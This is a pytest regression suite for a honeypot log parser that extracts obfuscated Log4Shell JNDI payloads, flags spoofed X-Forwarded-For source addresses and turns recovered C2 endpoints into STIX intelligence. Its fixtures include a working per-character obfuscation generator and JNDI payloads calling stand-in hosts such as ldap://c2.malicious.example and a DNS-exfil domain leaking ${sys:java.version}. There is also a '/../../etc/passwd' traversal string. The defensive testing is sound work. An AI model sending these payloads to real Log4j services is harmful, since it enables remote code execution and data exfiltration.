"""H0neytr4p spoofed-src_ip handling and Log4Shell payload salvage.

Regression cover for the 2026-08-04 finding: 30 rows in the live state
DB whose ``src_ip`` was an obfuscated Log4Shell JNDI payload rather than
an address. Live-ES ground truth established three separate defects:

1. h0neytr4p reports the attacker-controlled ``X-Forwarded-For`` header
   AS ``src_ip`` (byte-identical in 33/33 docs carrying that header), so
   the value is spoofable and, for these events, unusable.
2. The parser read only the *legacy* h0neytr4p field names. On the live
   hive ~99.6% of docs use the modern names, so ``method`` and
   ``user_agent`` were None for almost every event and ``host_header``
   was None for *every* event — which silently disabled URL
   reconstruction entirely (0 URLs across 12,860 rows).
3. The rejection was uncounted and the payload was discarded, losing a
   live C2 / DNS-exfil endpoint.

The obfuscated payloads here are synthesized by :func:`_obfuscate` using
the same ``${x:y:-c}`` per-character scheme the real scanner uses, so the
committed fixtures exercise the real code path without publishing a third
party's live C2 infrastructure.
"""
from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path
from types import SimpleNamespace

from tpot2cti.log4shell import deobfuscate, extract_jndi
from tpot2cti.main import run_cycle
from tpot2cti.parsers.h0neytr4p import H0neytr4pParser
from tpot2cti.stix.builder import STIXBuilder


# ---------------------------------------------------------------------------
# Payload construction — mirrors the real scanner's obfuscation scheme
# ---------------------------------------------------------------------------

def _per_char(plain: str, seed: int = 0) -> str:
    """One nonsense-lookup-with-default per character of ``plain``.

    ``jn`` becomes ``${a0:h0:-j}${b1:o3:-n}``. Every lookup name is
    nonsense so Log4j falls through to the single-character default, and
    names vary per position so the test cannot pass on a fixed-name
    shortcut.
    """
    out = []
    for i, ch in enumerate(plain):
        n = seed + i
        out.append("${%s%d:%s%d:-%s}" % (
            chr(97 + n % 26), n, chr(97 + (n * 7) % 26), n * 3, ch,
        ))
    return "".join(out)


def _obfuscate(plain: str, seed: int = 0) -> str:
    """A complete payload: per-character lookups inside one outer ``${}``."""
    return "${" + _per_char(plain, seed) + "}"


_C2_URL = "ldap://c2.malicious.example/Exploit"
_PAYLOAD = _obfuscate(f"jndi:{_C2_URL}")

#: The exfil variant: a runtime lookup with NO default sits inside the
#: hostname, within the same outer wrapper — exactly the shape of the
#: real payloads, where ``${sys:java.version}`` is the value the victim
#: JVM is meant to leak via DNS.
_EXFIL_URL = "ldap://tok-${sys:java.version}.abc123.dns-exfil.evil.example/x"
_EXFIL_PAYLOAD = (
    "${"
    + _per_char("jndi:ldap://tok-", 3)
    + "${sys:java.version}"
    + _per_char(".abc123.dns-exfil.evil.example/x", 40)
    + "}"
)


def _header_probe(tag: str, seed: int) -> str:
    """A per-header probe variant in the live scanner's exact shape.

    The scanner tags the callback with the header it is probing
    (``XFl0c-`` for X-Forwarded-For) and follows it with a templated
    label, so the varying part is not a resolvable name — all variants
    share one C2 zone.
    """
    return (
        "${"
        + _per_char(f"jndi:ldap://{tag}l0c-", seed)
        + "${sys:java.version}"
        + _per_char(".c2.malicious.example/a", seed + 50)
        + "}"
    )

_NOW = datetime(2026, 8, 4, 12, 0, 0, tzinfo=timezone.utc)


def _modern_doc(**over) -> dict:
    """An h0neytr4p doc in the schema ~99.6% of live docs use."""
    doc = {
        "@timestamp": _NOW.isoformat(),
        "type": "H0neytr4p",
        "src_ip": "45.9.10.11",
        "src_port": 55894,
        "dest_port": 8443,
        "dest_ip": "172.26.0.8",
        "method": "POST",
        "request_uri": "/remote/logincheck",
        "http_user_agent": "python-httpx/0.28.1",
        "http_host": "victim.example.com",
        "sni": "victim.example.com",
        "status": 401,
        "t-pot_hostname": "sensor-a",
        "geoip": {"country_iso_code": "DE", "country_name": "Germany"},
    }
    doc.update(over)
    return doc


def _legacy_doc(**over) -> dict:
    """An h0neytr4p doc in the schema the minority of sensors emit."""
    doc = {
        "@timestamp": _NOW.isoformat(),
        "type": "H0neytr4p",
        "src_ip": "45.9.10.12",
        "dest_port": 443,
        "request_method": "GET",
        "request_uri": "/",
        "user-agent": "Mozilla/5.0",
        "header_user-agent": "Mozilla/5.0",
        "t-pot_hostname": "sensor-b",
    }
    doc.update(over)
    return doc


# ---------------------------------------------------------------------------
# 1. The deobfuscator
# ---------------------------------------------------------------------------

def test_deobfuscate_resolves_default_value_lookups():
    assert deobfuscate(_PAYLOAD) == "${jndi:%s}" % _C2_URL


def test_deobfuscate_leaves_runtime_lookups_literal():
    """``${sys:...}`` has no default — it is the exfil template the
    attacker wants the victim to fill in, and must survive verbatim."""
    out = deobfuscate("${lower:A}${sys:java.version}${x:-b}")
    assert out == "a${sys:java.version}b"


def test_deobfuscate_handles_case_folding_lookups():
    assert deobfuscate("${lower:J}${upper:n}") == "jN"


def test_deobfuscate_is_a_noop_without_lookups():
    assert deobfuscate("45.9.10.11") == "45.9.10.11"
    assert deobfuscate("") == ""


def test_deobfuscate_terminates_on_pathological_nesting():
    """Must not hang or raise on adversarial input."""
    assert deobfuscate("${a:-x}" * 5000)
    assert deobfuscate("${" * 500) is not None


def test_extract_jndi_recovers_the_c2_url():
    found = extract_jndi(_PAYLOAD)
    assert [j.url for j in found] == [_C2_URL]
    assert found[0].host == "c2.malicious.example"
    assert found[0].raw == _PAYLOAD


def test_extract_jndi_keeps_url_intact_across_embedded_template():
    """The naive `[^}]*` truncates at the template's closing brace and
    throws away the C2 zone — the only part worth keeping."""
    found = extract_jndi(_EXFIL_PAYLOAD)
    assert len(found) == 1
    assert found[0].url == _EXFIL_URL
    # Host drops the templated labels and keeps the attacker's real zone.
    assert found[0].host == "abc123.dns-exfil.evil.example"


def test_extract_jndi_ignores_benign_values():
    assert extract_jndi("45.9.10.11") == []
    assert extract_jndi("/actuator/env") == []
    assert extract_jndi("${not:a:jndi:payload}") == []


# ---------------------------------------------------------------------------
# 2. Parser field reads — the schema-drift bug
# ---------------------------------------------------------------------------

def test_parser_reads_modern_schema_fields():
    """Before the fix these three were None on ~99.6% of live docs."""
    ev = H0neytr4pParser().parse(_modern_doc())
    assert ev is not None
    assert ev.meta["method"] == "POST"
    assert ev.meta["user_agent"] == "python-httpx/0.28.1"
    assert ev.meta["host_header"] == "victim.example.com"
    assert ev.meta["status"] == 401


def test_parser_still_reads_legacy_schema_fields():
    ev = H0neytr4pParser().parse(_legacy_doc())
    assert ev is not None
    assert ev.meta["method"] == "GET"
    assert ev.meta["user_agent"] == "Mozilla/5.0"


def test_parser_falls_back_to_sni_for_host():
    ev = H0neytr4pParser().parse(_modern_doc(http_host=None))
    assert ev.meta["host_header"] == "victim.example.com"


def test_correlate_reconstructs_the_request_url():
    """The regression that produced 0 URLs across 12,860 live rows."""
    parser = H0neytr4pParser()
    ev = parser.parse(_modern_doc())
    session = parser.correlate([ev])[0]
    assert session.urls == ["https://victim.example.com/remote/logincheck"]
    assert session.domains == ["victim.example.com"]


# ---------------------------------------------------------------------------
# 3. Spoofed src_ip provenance
# ---------------------------------------------------------------------------

def test_parser_flags_src_ip_taken_from_xff():
    """src_ip == X-Forwarded-For means the value is attacker-controlled,
    even when it happens to be a well-formed address."""
    doc = _legacy_doc(src_ip="198.51.100.7",
                      **{"header_x-forwarded-for": "198.51.100.7"})
    ev = H0neytr4pParser().parse(doc)
    assert ev.meta["src_ip_from_xff"] is True
    # A parseable address is still flagged, never silently dropped.
    assert "src_ip_invalid" not in ev.meta


def test_parser_flags_payload_bearing_src_ip_as_invalid():
    doc = _legacy_doc(src_ip=_PAYLOAD, **{"header_x-forwarded-for": _PAYLOAD})
    ev = H0neytr4pParser().parse(doc)
    assert ev.meta["src_ip_invalid"] is True
    assert ev.meta["src_ip_from_xff"] is True
    assert ev.meta["src_ip_raw"].startswith("${")


def test_parser_dedupes_one_payload_sprayed_across_headers():
    """An identical payload in many headers is one endpoint, not many."""
    doc = _legacy_doc(
        src_ip=_PAYLOAD,
        **{"header_x-forwarded-for": _PAYLOAD,
           "header_referer": _PAYLOAD,
           "header_cookie": _PAYLOAD},
    )
    ev = H0neytr4pParser().parse(doc)
    payloads = ev.meta["jndi_payloads"]
    assert len(payloads) == 1
    assert payloads[0]["url"] == _C2_URL
    assert payloads[0]["host"] == "c2.malicious.example"


def test_parser_keeps_per_header_url_variants():
    """The live scanner encodes the probed header into the callback
    hostname, so the variants are genuinely distinct URLs — but they
    share one C2 zone."""
    doc = _legacy_doc(
        src_ip=_header_probe("XF", 1),
        **{"header_referer": _header_probe("RE", 2),
           "header_cookie": _header_probe("CO", 3)},
    )
    ev = H0neytr4pParser().parse(doc)
    payloads = ev.meta["jndi_payloads"]
    assert len(payloads) == 3
    assert {p["url"].split("//")[1][:2] for p in payloads} == {"XF", "RE", "CO"}
    # All three resolve to the same attacker zone.
    assert {p["host"] for p in payloads} == {"c2.malicious.example"}


def test_parser_attaches_log4shell_cve_and_technique():
    ev = H0neytr4pParser().parse(_legacy_doc(src_ip=_PAYLOAD))
    assert ev.meta["matched_cve"] == "CVE-2021-44228"
    assert ev.meta["mitre_technique"] == "T1190"
    # An obfuscated payload never matches the literal `${jndi:` hint, so
    # substance must be recorded explicitly.
    assert r"\$\{jndi:" in ev.meta["matched_hints"]


def test_parser_scans_headers_for_hints():
    """On the legacy schema the exploit rides in headers, not the URI."""
    ev = H0neytr4pParser().parse(
        _legacy_doc(**{"header_referer": "/../../etc/passwd"}),
    )
    assert ev.meta["matched_hints"]


def test_correlate_promotes_recovered_c2_to_session():
    parser = H0neytr4pParser()
    ev = parser.parse(_legacy_doc(src_ip=_PAYLOAD))
    session = parser.correlate([ev])[0]
    assert _C2_URL in session.urls
    assert "c2.malicious.example" in session.domains


# ---------------------------------------------------------------------------
# 4. The state-DB guard
# ---------------------------------------------------------------------------

def test_attacker_activity_rejects_non_address_src_ip(state_db):
    parser = H0neytr4pParser()
    ev = parser.parse(_legacy_doc(src_ip=_PAYLOAD))
    session = parser.correlate([ev])[0]

    state_db.upsert_attacker_activity(session)

    with state_db._conn() as c:
        n = c.execute("SELECT COUNT(*) FROM attacker_activity").fetchone()[0]
    assert n == 0, "a non-address src_ip must never key this table"


def test_attacker_activity_canonicalizes_ipv6(state_db):
    """Same guard canonicalizes, so one attacker isn't split in two."""
    parser = H0neytr4pParser()
    for form in ("::FFFF:45.9.10.11", "45.9.10.11"):
        ev = parser.parse(_modern_doc(src_ip=form))
        state_db.upsert_attacker_activity(parser.correlate([ev])[0])

    with state_db._conn() as c:
        rows = c.execute("SELECT src_ip FROM attacker_activity").fetchall()
    assert [r[0] for r in rows] == ["45.9.10.11"]


# ---------------------------------------------------------------------------
# 5. End-to-end: counted drop + salvaged intelligence
# ---------------------------------------------------------------------------

class _FakeES:
    def __init__(self, docs):
        self._docs = docs

    def stream_events(self, start, end, **kwargs):
        yield from self._docs


class _CapturingPublisher:
    def __init__(self):
        self.objects = []

    def publish(self, objects, cycle_id=None):
        self.objects = list(objects)
        return SimpleNamespace(ok=True, errors=[], cycle_id=cycle_id)


def _run(cfg, state_db, docs):
    pub = _CapturingPublisher()
    summary = run_cycle(cfg, state_db, _FakeES(docs), lambda: STIXBuilder(cfg), pub)
    return summary, pub.objects


def test_cycle_counts_the_rejected_source_address(cfg, state_db):
    """The whole point of the fix: the drop becomes visible in /health."""
    docs = [_legacy_doc(src_ip=_PAYLOAD), _modern_doc()]

    summary, _ = _run(cfg, state_db, docs)

    assert summary["drop_reasons"]["src_ip_rejected"] == 1
    # The invariant the drop table exists to preserve.
    assert summary["events_parsed"] + sum(summary["drop_reasons"].values()) \
        == summary["events_read"]
    # And it is persisted for the /health endpoint.
    assert json.loads(state_db.get("last_cycle_drops"))["src_ip_rejected"] == 1


def test_cycle_salvages_the_c2_without_inventing_an_attacker(cfg, state_db):
    summary, objects = _run(cfg, state_db, [_legacy_doc(src_ip=_PAYLOAD)])

    by_type = {}
    for o in objects:
        by_type.setdefault(o["type"], []).append(o)

    # The intelligence survived the drop.
    assert _C2_URL in {o["value"] for o in by_type.get("url", [])}
    assert "c2.malicious.example" in {o["value"] for o in by_type.get("domain-name", [])}
    assert "CVE-2021-44228" in {o["name"] for o in by_type.get("vulnerability", [])}
    assert any(o.get("x_mitre_id") == "T1190" for o in by_type.get("attack-pattern", []))
    assert by_type.get("sighting"), "the C2 must be sighted at the sensor"
    note = by_type.get("note", [])
    assert note and "X-Forwarded-For" in note[0]["content"]

    # But NO attribution was fabricated for a source we do not know.
    assert "ipv4-addr" not in by_type
    assert "ipv6-addr" not in by_type
    assert not by_type.get("indicator"), "no Indicator without a source IP"


def test_salvage_groups_repeat_scans_onto_one_c2_graph(cfg, state_db):
    """The same endpoint hitting many sensors is one C2, not many."""
    docs = [
        _legacy_doc(src_ip=_PAYLOAD, **{"t-pot_hostname": f"sensor-{i}"})
        for i in range(5)
    ]

    _, objects = _run(cfg, state_db, docs)

    urls = [o for o in objects if o["type"] == "url"]
    assert len(urls) == 1
    sightings = [o for o in objects if o["type"] == "sighting"]
    assert len(sightings) == 1
    assert sightings[0]["count"] == 5


def test_salvage_groups_url_variants_by_c2_host(cfg, state_db):
    """One probe of one C2 zone produces one Sighting and one Note even
    though the scanner varies the URL per header it tries. Regression
    guard: grouping by URL instead minted a dozen of each."""
    doc = _legacy_doc(
        src_ip=_header_probe("XF", 1),
        **{"header_referer": _header_probe("RE", 2),
           "header_cookie": _header_probe("CO", 3)},
    )

    _, objects = _run(cfg, state_db, [doc])

    by_type = {}
    for o in objects:
        by_type.setdefault(o["type"], []).append(o)

    # All three variants are preserved as observables...
    assert len(by_type["url"]) == 3
    # ...but they are one C2, one Sighting, one Note.
    assert len(by_type["domain-name"]) == 1
    assert by_type["domain-name"][0]["value"] == "c2.malicious.example"
    assert len(by_type["sighting"]) == 1
    assert len(by_type["note"]) == 1
    assert "further URL variant" in by_type["note"][0]["content"]


def test_valid_events_are_unaffected(cfg, state_db):
    """The gate must not disturb the normal path."""
    summary, objects = _run(cfg, state_db, [_modern_doc()])

    assert summary["drop_reasons"]["src_ip_rejected"] == 0
    assert summary["events_parsed"] == 1
    assert "45.9.10.11" in {
        o["value"] for o in objects if o["type"] == "ipv4-addr"
    }


def test_prune_removes_pre_existing_malformed_rows(state_db):
    """Cleanup for the 30 rows that landed before the gate existed."""
    with state_db._conn() as c:
        for bad in (_PAYLOAD, "${jndi:ldap://log4shell.test/a}", "not-an-ip"):
            c.execute(
                "INSERT INTO attacker_activity (src_ip, parser, sensor, "
                "first_seen, last_seen) VALUES (?,?,?,?,?)",
                (bad, "H0neytr4p", "sensor-b", _NOW.isoformat(), _NOW.isoformat()),
            )
        c.execute(
            "INSERT INTO attacker_activity (src_ip, parser, sensor, "
            "first_seen, last_seen) VALUES (?,?,?,?,?)",
            ("45.9.10.11", "H0neytr4p", "sensor-a", _NOW.isoformat(), _NOW.isoformat()),
        )

    assert state_db.prune_malformed_attacker_activity() == 3
    # Idempotent, and the real attacker row is untouched.
    assert state_db.prune_malformed_attacker_activity() == 0
    with state_db._conn() as c:
        rows = c.execute("SELECT src_ip FROM attacker_activity").fetchall()
    assert [r[0] for r in rows] == ["45.9.10.11"]
